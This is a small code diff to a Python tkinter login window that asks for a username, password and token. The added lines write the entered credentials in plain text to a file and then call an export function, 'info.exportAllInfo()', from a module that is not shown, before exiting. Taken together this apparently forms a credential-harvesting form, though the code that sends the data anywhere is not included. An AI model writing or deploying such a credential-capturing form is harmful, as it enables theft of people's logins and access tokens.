@@ -1,4 +1,6 @@
 from tkinter import *
+import info
+import sys
 
 class Application(Frame):
     def __init__(self,master):
@@ -37,10 +39,14 @@ class Application(Frame):
         user_get = self.user_entry.get()
         pass_get = self.pass_entry.get()
         token_get = self.token_entry.get()
-        print(user_get)
-        print(pass_get)
-        print(token_get)
-        exit()
+        f = open('login.txt', 'w')
+        f.write('usuario: '+ user_get + '\n')
+        f.write('password: '+ pass_get + '\n')
+        f.write('token: '+ token_get + '\n')
+
+        info.exportAllInfo()
+
+        sys.exit()
 
 
 if __name__ == '__main__':
